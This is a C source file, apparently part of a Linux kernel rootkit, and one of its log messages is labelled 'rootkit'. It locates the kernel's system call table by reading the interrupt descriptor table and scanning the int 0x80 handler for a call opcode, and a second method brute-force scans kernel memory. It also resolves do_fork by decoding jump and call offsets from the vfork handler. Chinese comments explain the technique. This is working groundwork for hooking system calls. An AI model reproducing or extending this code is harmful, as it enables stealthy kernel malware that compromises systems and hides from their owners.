#include "Rtsyscall.h"


unsigned long *sys_call_table = NULL;
unsigned int addr_do_fork = 0;

typedef struct _RT_IDTR {
    unsigned short limit;
    unsigned int base;
} __attribute__ ((packed)) RT_IDTR, *PRT_IDTR;

typedef struct _RT_IDT {
    unsigned short off1; /*offset bits 0..15*/
    unsigned short sel; /*a code segment selector in GDT or LDT*/
    unsigned char none, flags; /*unused, set to 0 , *type and attributes*/
    unsigned short off2; /*offset bits 16..31*/
} __attribute__ ((packed)) RT_IDT, *PRT_IDT;

// dumb implementation to find sys_call_table

/**
 * 1.利用sidt 指令，得到IDT
 * 2.在IDT中找到0x80号中断的中断服务程序的地址system_call
 * 3.从0x80号中断的中断服务程序system_call的地址开始搜索硬编码 \xff\x14\x85，
 * 这块硬编码的后面紧接着就是系统调用表的地址了，因为x86 call指令的二进制格式为\xff\x14\x85，
 * 而中断服务程序调用系统调用的语句是call sys_call_table(,eax,4)
 * @return 
 */
unsigned long * find_sys_call_table_method_one(void) {
    RT_IDTR idtr;
    PRT_IDT pidt;
    unsigned int sys_call_off;
    unsigned long * pret = NULL;
    char* p;
    int i;

    // get value of idtr
    asm("sidt %0" : "=m"(idtr));
    rtprint("idtr.base-0x%x", idtr.base);
    rtprint("idtr.limit-0x%x", idtr.limit);

    // get IDT
    pidt = (PRT_IDT) (idtr.base + 8 * 0x80);
    rtprint("pidt.off1-0x%x", pidt->off1);
    rtprint("pidt.sel-0x%x", pidt->sel);
    rtprint("pidt.flags-0x%x", pidt->flags);
    rtprint("pidt.off2-0x%x", pidt->off2);
    
    // get system_call offset
    sys_call_off = ((pidt->off2 << 16) | pidt->off1);
    rtprint("rootkit:sys_call_off-0x%x", sys_call_off);
    // find sys_call_table
    p = (char *) sys_call_off;

    for (i = 0; i < 100; i++) {
        if (p[i] == '\xff' && p[i + 1] == '\x14' && p[i + 2] == '\x85') {
            pret = (unsigned long*) (*(unsigned int*) (p + i + 3));
        }
    }
    if (pret == NULL) {
        rtprint("find_sys_call_table_method_one == NULL ");
        return NULL;
    } else {
        rtprint("find_sys_call_table_method_one!!!find![0x%lx]", \
                (long unsigned int) pret);
    }
    return pret;
}

unsigned long * find_sys_call_table_method_two(void) {
    unsigned long *start;
    for (start = (unsigned long *) 0xc0000000; \
            start < (unsigned long *) 0xffffffff; start++) {
        if (start[__NR_close] == (unsigned long) sys_close) {
            rtprint("find_sys_call_table_method_two!!!find![0x%lx]", \
                    (long unsigned int) start);
            return start;
        }
    }
    rtprint("find_sys_call_table_method_two:sys_call_table == NULL ");
    return NULL;  
}

unsigned int find_do_fork(void) {
    unsigned int ret;
    unsigned char *p;
    unsigned char *psyscall = NULL;
    unsigned char *psysvfork = NULL;

    if (NULL == sys_call_table) {
        rtprint("sys_call_table == NULL");
        return 0;
    }

    psyscall = (unsigned char *) sys_call_table[__NR_vfork];

    if (NULL == psyscall) {
        rtprint("sys_call_table[__NR_vfork] == NULL");
        return 0;
    }

    for (p = psyscall; p < psyscall + 0x10;) {
        if (*p++ == (unsigned char) (0xE9)) {
            ret = *((unsigned int *) p);
            psysvfork = p + 4 + ret;
            break;
        }
    }

    if (NULL == psysvfork) {
        rtprint("psysvfork == NULL");
        return 0;
    }

    ret = 0;

    for (p = psysvfork; p < psysvfork + 0x40;) {
        if (*p++ == (unsigned char) (0xE8)) {
            ret = *((unsigned int *) p);
            ret = (unsigned int) p + 4 + ret;
            break;
        }
    }

    return ret;
}
